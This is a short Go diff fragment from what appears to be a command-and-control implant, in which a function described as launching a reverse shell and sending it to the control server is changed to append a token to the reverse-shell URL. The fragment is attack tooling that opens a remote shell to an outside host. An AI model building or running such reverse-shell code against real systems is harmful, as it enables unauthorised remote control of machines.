@@ -20,7 +20,7 @@ import (
 // ActivateShell launch reverse shell and send it to CC
 func ActivateShell(token string) (err error) {
 	var (
-		rshellURL = CCAddress + tun.ReverseShellAPI
+		rshellURL = CCAddress + tun.ReverseShellAPI + "/" + token
 		shellPID  = 0 // PID of the bash shell
 
 		// buffer for reverse shell
